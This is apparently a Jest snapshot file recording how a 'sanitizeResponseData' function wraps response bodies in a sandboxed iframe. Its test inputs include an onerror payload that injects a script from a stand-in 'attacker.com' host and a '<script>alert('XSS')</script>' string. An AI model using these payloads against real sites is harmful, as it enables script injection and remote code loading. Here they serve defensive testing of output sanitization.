// Jest Snapshot v1, https://goo.gl/fbAQLP

exports[`sanitizeResponseData wraps the response body in an iframe 1`] = `
"
		<iframe srcdoc="https://example.com" sandbox="allow-scripts allow-forms allow-popups allow-modals allow-orientation-lock allow-pointer-lock allow-presentation allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation"
			style="position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; overflow:auto;"
			allowtransparency="true">
		</iframe>"
`;

exports[`sanitizeResponseData wraps the response body in an iframe 2`] = `
"
		<iframe srcdoc="<source onerror=&quot;s=document.createElement('script');s.srcdoc='http://attacker.com/evil.js';document.body.appendChild(s);&quot;>" sandbox="allow-scripts allow-forms allow-popups allow-modals allow-orientation-lock allow-pointer-lock allow-presentation allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation"
			style="position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; overflow:auto;"
			allowtransparency="true">
		</iframe>"
`;

exports[`sanitizeResponseData wraps the response body in an iframe 3`] = `
"
		<iframe srcdoc="<div>Test with  'single quote'</div>" sandbox="allow-scripts allow-forms allow-popups allow-modals allow-orientation-lock allow-pointer-lock allow-presentation allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation"
			style="position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; overflow:auto;"
			allowtransparency="true">
		</iframe>"
`;

exports[`sanitizeResponseData wraps the response body in an iframe 4`] = `
"
		<iframe srcdoc="John's company &quot;TechCorp &amp; Associates&quot; announced: 'We're launching a revolutionary product at â‚¬1,299.99 â€” it's 50% faster than competitors!' The CEO said, &quot;This isn't just an upgrade; it's a complete transformation.&quot; Users praised the app's ability to handle complex data like <script>alert('XSS')</script> and symbols such as @, #, $, %, ^, &amp;, *, (, ), [, ], {, }, |, , /, ?, <, >, ~, \`, +, =, -, _, and even emojis like ðŸš€ &amp; ðŸ’¡. The product description reads: &quot;It supports UTF-8 encoding, handles apostrophes in names like O'Connor &amp; D'Angelo, processes mathematical expressions like 2 < 5 > 1, and manages URLs such as https://example.com/path?param=value&amp;other='test'. We've tested it with HTML entities like &amp;amp;, &amp;lt;, &amp;gt;, &amp;quot;, &amp;#39;, and even complex strings like \`console.log(&quot;Hello 'World'!&quot;);\`&quot; â€” truly impressive!" sandbox="allow-scripts allow-forms allow-popups allow-modals allow-orientation-lock allow-pointer-lock allow-presentation allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation"
			style="position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; overflow:auto;"
			allowtransparency="true">
		</iframe>"
`;
